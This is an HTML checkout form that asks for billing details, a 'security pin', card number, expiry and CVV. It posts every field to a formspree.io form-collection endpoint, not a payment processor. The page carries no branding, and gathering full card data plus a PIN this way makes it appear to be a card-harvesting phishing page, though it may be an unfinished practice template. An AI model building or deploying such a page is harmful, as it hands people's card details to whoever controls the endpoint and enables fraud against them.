<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- custom css file link  -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
    <form action="https://formspree.io/f/xoqzvkqj" method="Post">
        <div class="row">
            <div class="col">
                <h3 class="title">billing address</h3>
                <div class="inputBox">
                    <span>full name :</span>
                     <textarea name="Message" placeholder="Full name" required></textarea>
                </div>
                <div class="inputBox">
                    <span>email :</span>
                    <input type="email" name="Email" placeholder="Email" required>
                </div>
                <div class="inputBox">
                    <span>Country :</span>
                    <textarea name="Message" placeholder="South africa" required></textarea>
                </div>
                <div class="inputBox">
                    <span>city :</span>
                    <textarea name="Message" placeholder="Cape Town" required></textarea>
                </div>
                <div class="flex">
                    <div class="inputBox">
                        <span>Suburb :</span>
                        <textarea name="Message" placeholder="Northern" required></textarea>
                    </div>
                    <div class="inputBox">
                        <span>security pin :</span>
                        <textarea name="Message" placeholder="For Security" required></textarea>
                    </div>
                </div>
            </div>
            <div class="col">
                <h3 class="title">payment</h3>
                <div class="inputBox">
                    <span>cards accepted :</span>
                    <img src="card_img.png" alt="">
                </div>
                <div class="inputBox">
                    <span>name on card :</span>
                    <textarea name="Message" placeholder="Full Name" required></textarea>
                </div>
                <div class="inputBox">
                    <span>credit card number :</span>
                    <textarea name="Message" placeholder="1111 2222 3333 4444" required></textarea>
                </div>
                <div class="inputBox">
                    <span>exp month :</span>
                    <textarea name="Message" placeholder="01" required></textarea>
                </div>
                <div class="flex">
                    <div class="inputBox">
                        <span>exp year :</span>
                        <textarea name="Message" placeholder="2023" required></textarea>
                    </div>
                    <div class="inputBox">
                        <span>CVV :</span>
                       <textarea name="Message" placeholder="123" required></textarea>
                    </div>
                </div>
            </div>
        </div>
        <input type="submit" value="proceed to checkout" class="submit-btn">
    </form>
</div>    
</body>
</html>
